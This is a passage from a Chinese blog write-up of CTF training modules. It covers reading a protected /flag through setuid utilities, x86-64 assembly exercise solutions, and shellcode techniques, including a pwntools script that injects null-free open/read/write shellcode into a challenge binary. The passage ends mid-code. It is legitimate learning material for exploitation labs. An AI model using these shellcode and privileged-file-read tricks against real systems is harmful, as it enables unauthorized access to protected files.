/flag | base32 -d</code> </p></li><li><p>split: split file into pieces. <code>split /flag</code> </p></li><li><p><code>gzip -c /flag | gzip -cd </code> </p></li><li><p>bzip2 有新的机制, 不过命令行参数和gzip非常接近</p></li><li><p><code>zip - /flag &gt; aa</code> and then<code>cat aa</code>    or    <code>unzip -p aa</code> </p></li><li><p><code>tar cf flag.tar flag</code> then <code>tar -xOf flag.tar</code> 研究了半天tar的参数, main operation那几个参数每次必须加上. f参数后紧跟文件名</p></li><li><p><code>ar c flag.ar flag</code> then <code>cat flag.ar</code> 发现经过root用户创建完archive之后直接就对其他用户可读了…更简单了</p></li><li><p>(23- )  cpio genisoimage: ???</p><ul><li><p><code>echo &quot;/flag&quot; | cpio -ov &gt; ~/flag.cpio</code> then <code>cat flagcpio</code> 不是直接将/flag放到cpio的stdin中……他只要<u>name-list</u>……</p></li><li></li></ul></li><li><p>env也行?太神奇了. <code>env cat /flag</code> </p></li><li><p><code>find /flag -maxdepth 0 -exec cat &#39;&#123;&#125;&#39; \;</code> </p></li><li></li></ul><h1 id="module-3-asm"><a href="#module-3-asm" class="headerlink" title="module 3-asm"></a>module 3-asm</h1><p>就是汇编代码的写</p><h2 id="3-简单乘法"><a href="#3-简单乘法" class="headerlink" title="3 简单乘法"></a>3 简单乘法</h2><p>要注意mul指令默认被乘数放在rax里面, 乘数由我们指定, 结果是拼接而成的: <strong>RDX:RAX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(glob(<span class="hljs-string">&quot;/challenge/e*&quot;</span>))<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">mov rcx, rdx</span><br><span class="hljs-string">mul rsi</span><br><span class="hljs-string">add rax, rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-5-除法"><a href="#4-5-除法" class="headerlink" title="4-5 除法"></a>4-5 除法</h2><p>被除数放在<strong>RAX</strong>, 除数待定, 结果放在 <strong>RAX</strong>, 余数放在<strong>RDX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">mov rax, rdx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-低位寄存器的名称"><a href="#6-低位寄存器的名称" class="headerlink" title="6: 低位寄存器的名称"></a>6: 低位寄存器的名称</h2><p>低位寄存器的名称要特别注意, rdi就是这么写错了, mov的两个操作数如果长度不匹配会报错:<code>unsupported instruction &#39;mov&#39;</code> </p><table><thead><tr><th><strong>Name</strong></th><th>Notes</th><th>Type</th><th>64</th><th>32</th><th>16</th><th>8</th></tr></thead><tbody><tr><td>rax</td><td>Values are returned from functions in this register.</td><td>scratch</td><td>rax</td><td>eax</td><td>ax</td><td>ah and al</td></tr><tr><td>rcx</td><td>Typical scratch register.  Some instructions also use it as a counter.</td><td>scratch</td><td>rcx</td><td>ecx</td><td>cx</td><td>ch and cl</td></tr><tr><td>rdx</td><td>Scratch register.</td><td>scratch</td><td>rdx</td><td>edx</td><td>dx</td><td>dh and dl</td></tr><tr><td><em>rbx</em></td><td><em>Preserved register: don’t use it without saving it!</em></td><td><em>preserved</em></td><td><em>rbx</em></td><td><em>ebx</em></td><td><em>bx</em></td><td><em>bh and bl</em></td></tr><tr><td><em>rsp</em></td><td><em>The stack pointer.  Points to the top of the stack (details coming soon!)</em></td><td><em>preserved</em></td><td><em>rsp</em></td><td><em>esp</em></td><td><em>sp</em></td><td><em>spl</em></td></tr><tr><td><em>rbp</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>rbp</em></td><td><em>ebp</em></td><td><em>bp</em></td><td><em>bpl</em></td></tr><tr><td>rsi</td><td>Scratch register.  Function argument #2 in 64-bit Linux</td><td>scratch</td><td>rsi</td><td>esi</td><td>si</td><td>sil</td></tr><tr><td>rdi</td><td>Scratch register.  Function argument #1 in 64-bit Linux</td><td>scratch</td><td>rdi</td><td>edi</td><td>di</td><td>dil</td></tr><tr><td>r8</td><td>Scratch register.  These were added in 64-bit mode</td><td>scratch</td><td>r8</td><td>r8d</td><td>r8w</td><td>r8b</td></tr><tr><td>r9</td><td>Scratch register.</td><td>scratch</td><td>r9</td><td>r9d</td><td>r9w</td><td>r9b</td></tr><tr><td>r10</td><td>Scratch register.</td><td>scratch</td><td>r10</td><td>r10d</td><td>r10w</td><td>r10b</td></tr><tr><td>r11</td><td>Scratch register.</td><td>scratch</td><td>r11</td><td>r11d</td><td>r11w</td><td>r11b</td></tr><tr><td><em>r12</em></td><td><em>Preserved register.  You can use it, but you need to save and restore it.</em></td><td><em>preserved</em></td><td><em>r12</em></td><td><em>r12d</em></td><td><em>r12w</em></td><td><em>r12b</em></td></tr><tr><td><em>r13</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r13</em></td><td><em>r13d</em></td><td><em>r13w</em></td><td><em>r13b</em></td></tr><tr><td><em>r14</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r14</em></td><td><em>r14d</em></td><td><em>r14w</em></td><td><em>r14b</em></td></tr><tr><td><em>r15</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r15</em></td><td><em>r15d</em></td><td><em>r15w</em></td><td><em>r15b</em></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov al, dil</span><br><span class="hljs-string">mov bx, si</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="8-9-bitwise-op"><a href="#8-9-bitwise-op" class="headerlink" title="8-9 bitwise op"></a>8-9 bitwise op</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-number">8.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or  rax, rdi</span><br><span class="hljs-string">and rax, rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-number">9.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">and rdi, 1</span><br><span class="hljs-string">xor rdi, 1</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or rax, rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-开始内存操作"><a href="#10-开始内存操作" class="headerlink" title="10. 开始内存操作"></a>10. 开始内存操作</h2><p>注意add没有 <code>add mem, imm</code>这种形式, 因为时钟周期根本不够 </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">mov rdx, 0x404000 </span><br><span class="hljs-string">mov rcx, [rdx] </span><br><span class="hljs-string">mov rax, rcx </span><br><span class="hljs-string">add rcx, 0x1337 </span><br><span class="hljs-string">mov [rdx], rcx </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>11.简单的rax, eax, ax, ah, al的使用.</p><p>12.要注意时钟周期的问题. 常数要先移动到寄存器</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, 0xdeadbeef00001337</span><br><span class="hljs-string">mov rbx, 0x000000C0FFEE0000</span><br><span class="hljs-string">mov [rdi], rax</span><br><span class="hljs-string">mov [rsi], rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>13.利用地址偏移, 简单的.</p><h2 id="14-16-栈相关指令-太简单了-都是些基础题-过了就算了"><a href="#14-16-栈相关指令-太简单了-都是些基础题-过了就算了" class="headerlink" title="14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了"></a>14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了</h2><h2 id="17-跳转"><a href="#17-跳转" class="headerlink" title="17. 跳转"></a>17. 跳转</h2><p>nop的数量数错了, 诶他说的是0x51 bytes from current position, 但是这指的是jmp后面一条指令的地址. 不是jmp的起始地址…..</p><p>还要注意<code>绝对跳转只能是间接跳转(line 6)</code>( 要和<code>条件跳转只能是直接跳转</code>一起记清楚 )</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp L1</span><br><span class="hljs-string">(0x51 nops)</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">mov rcx, 0x403000</span><br><span class="hljs-string">jmp rcx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>18.if-elif-else连环, 要注意的是他说[rdi]是一个双字, 可能是一个负数, 所以我第一次写的<code>QWORD PTR</code>就错了, 只能是<code>DWORD PTR</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov eax, [rdi+4]</span><br><span class="hljs-string">mov r8d, [rdi+8]</span><br><span class="hljs-string">mov r9d, [rdi+12]</span><br><span class="hljs-string">cmp DWORD ptr [rdi], 0x7f454c46 #!!!!!!</span><br><span class="hljs-string">jne leif</span><br><span class="hljs-string">add eax, r8d</span><br><span class="hljs-string">add eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">leif:</span><br><span class="hljs-string">cmp DWORD PTR[rdi], 0x00005A4D #!!!!!!                                                 </span><br><span class="hljs-string">jne else</span><br><span class="hljs-string">sub eax, r8d</span><br><span class="hljs-string">sub eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    mul r8d</span><br><span class="hljs-string">    mul r9d</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>19.<strong>条件跳转只能是直接跳转</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    CMP RDI, 4</span><br><span class="hljs-string">    JL AAA</span><br><span class="hljs-string">    MOV RDI, 4</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    mov rbx, 8</span><br><span class="hljs-string">    mul rbx</span><br><span class="hljs-string">    mov ebx, DWORD PTR [rax+rsi]</span><br><span class="hljs-string">    jmp rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>20.折腾了半天, 发现题目描述有错的地方, 这里明明是DWORD, 说成quad word.</p><p>还有一点被我忽略了, 如果按照add eax, ebx的做法, <strong>那么超出四字节的部分会被舍弃</strong> </p><p>这里我想到的做法是用eax取出双字数据, 然后用rax做加法.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    mov eax, [rdi+rbx*4]    #在这里</span><br><span class="hljs-string">    add rcx, rax</span><br><span class="hljs-string">    inc rbx</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, rcx</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>21.硬是没有简化成</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">test rdi, rdi                                                                                                                                                                                 </span><br><span class="hljs-string">jz done</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    inc rax</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    mov cl, [rdi]</span><br><span class="hljs-string">    test rcx, rcx</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="22-调用"><a href="#22-调用" class="headerlink" title="22.调用"></a>22.调用</h2><p>又是折腾了半天, 主要是逐字节比较的, 从题干也看不出来啊, 孤零零的[src_addr]真就指一个BYTE</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov r12, 0x403000</span><br><span class="hljs-string">mov rdx, rdi    ; tmp store rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">test rdx, rdx</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">test:</span><br><span class="hljs-string">mov rsi, [rdx]</span><br><span class="hljs-string">test sil, sil    ;fetched from memory and then comparized bitwise</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">cmp sil, 90</span><br><span class="hljs-string">jg if</span><br><span class="hljs-string">mov r13, rax    ;preparation for call foo at 0x403000</span><br><span class="hljs-string">mov dil, [rdx]</span><br><span class="hljs-string">call r12</span><br><span class="hljs-string">mov [rdx], al</span><br><span class="hljs-string">mov rax, r13</span><br><span class="hljs-string">inc rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">if:</span><br><span class="hljs-string">inc rdx</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>23.偷懒, 用了别人的代码, 复习操作系统去了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">;source code:<br>most_common_byte(src_addr, size):<br>    b = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i &lt;= size-<span class="hljs-number">1</span>:<br>        curr_byte = [src_addr + i]<br>        [stack_base - curr_byte] += <span class="hljs-number">1</span><br>    b = <span class="hljs-number">0</span><br><br>    max_freq = <span class="hljs-number">0</span><br>    max_freq_byte = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> b &lt;= <span class="hljs-number">0xff</span>:<br>        <span class="hljs-keyword">if</span> [stack_base - b] &gt; max_freq:<br>            max_freq = [stack_base - b]<br>            max_freq_byte = b<br><br>    <span class="hljs-keyword">return</span> max_freq_byte<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rbp</span><br><span class="hljs-string">    mov rbp, rsp</span><br><span class="hljs-string">    sub rsp, 0x100</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    je BBB</span><br><span class="hljs-string">    mov cl, byte ptr [rdi+rbx]</span><br><span class="hljs-string">    add BYTE ptr [rsp+rcx], 1</span><br><span class="hljs-string">    jmp AAA</span><br><span class="hljs-string"></span><br><span class="hljs-string">BBB:</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">CCC:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, 0x100</span><br><span class="hljs-string">    je DDD</span><br><span class="hljs-string">    cmp BYTE ptr [rsp+rbx], CL</span><br><span class="hljs-string">    jle CCC</span><br><span class="hljs-string">    mov CL, BYTE ptr [rsp+rbx]</span><br><span class="hljs-string">    mov rdx, rbx</span><br><span class="hljs-string">    JMP CCC</span><br><span class="hljs-string"></span><br><span class="hljs-string">DDD:</span><br><span class="hljs-string">    mov rax, rdx</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    pop rbp</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h1 id="module-4-sc"><a href="#module-4-sc" class="headerlink" title="module 4-sc"></a>module 4-sc</h1><p>基本全在PPT里面.</p><h2 id="0-基本操作"><a href="#0-基本操作" class="headerlink" title="0.基本操作"></a>0.基本操作</h2><ul><li>intro:<ul><li><p>Buiding shellcode: just using pwntools.</p></li><li><p>Debugging: strace or gdb</p></li></ul></li><li>common challenge:<ul><li><p><strong>forbidden bytes:</strong> such as <code>NULL(&#39;\0&#39;)</code>, <code>whitespace</code>,  <code>&#39;H&#39;</code> and so on.</p></li><li><p><strong>self-modifying codes</strong> in level 5.<br><code>gcc -Wl,-N --static -nostdlib -o test test.s</code> to make writable <code>.text</code> segment</p></li><li><p><strong>multistage shellcoding:</strong><br>read into later bytes; or read into <code>read(0, rip, 1000)</code> (using <code>lea rax, [rip]</code> get rip)</p></li><li><p><strong>Shellcode Mangling:</strong><br><u>work backwards</u>  or  <u>jump over some parts to avoid them</u>.</p></li><li><p><strong>Unable to speak:</strong><br>if you can communicate one bit, then you can communicate.<br>such as a exit code? maybe inefficient. or signal? or …</p></li></ul></li><li>Remain injection points: JIT, jus-in-time, 即时.</li></ul><p>avoid null-bytes:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov rdi, 0 -&gt; xor rdi, rdi<br>xor edi, edi //will clear rdi<br>mov rax, 2 -&gt; mov al , 2<br>mov rsi, 100 -&gt; xor rsi, rsi / mov si, 100<br>;set a byte(0x01) in the asm, then dec that address<br>lea rdi, [rip+0x3d] -&gt; mov byte ptr [rip+1], &#x27;/&#x27; ;and then, the whole string: &#x27;/flag&#x27;<br><br>mov rsi, 0x1017eff3d8d4981 --&gt;<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br></code></pre></div></td></tr></table></figure><h2 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h2><p>非常直接的一道题目, 不过我重新认识了一下shellcode, 原来amd64.open做的事情还包括防止指令序列中出现<code>&#39;\0&#39;</code>, 以前用的都没有细想这个问题. 不过前两题都是用的read函数直接读取stdin直到eof, 所以不需要担心空字符的问题.<del>amd64.open这个函数我都没有在文档里面查到.</del> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/b*&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-comment">#直接使用wildcard, 不过会匹配到c和binary, 选择第二个即可</span><br>context.binary = binary<br>p = process(binary) <br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>测试程序直接从stdin读取bytes然后存储到数组中, 把数组指针转换成函数指针调用即可执行shellcode.</p><p>附一个asm, 了解一下原理.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movabs rax, 0x101010101010101<br>push rax<br>movabs rax, 0x1010166606d672e # 写入&#x27;flag&#x27;字符串<br>xor qword ptr [rsp], rax<br>mov rdi, rsp<br>xor edx, edx<br>xor esi, esi<br>push 2<br>pop rax<br>syscall    # open<br><br>mov rdi, rax<br>xor eax, eax<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>syscall # read<br><br>push 1<br>pop rdi<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>push 1<br>pop rax<br>syscall     # write to stdout<br></code></pre></div></td></tr></table></figure><h2 id="2-emmmm"><a href="#2-emmmm" class="headerlink" title="2.emmmm"></a>2.emmmm</h2><blockquote><p>This challenge will <strong>randomly skip up to 0x800 bytes</strong> in your shellcode. You better adapt to that! One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as <code>nop</code>, before the actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. This concept is called a <code>nop sled</code>.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 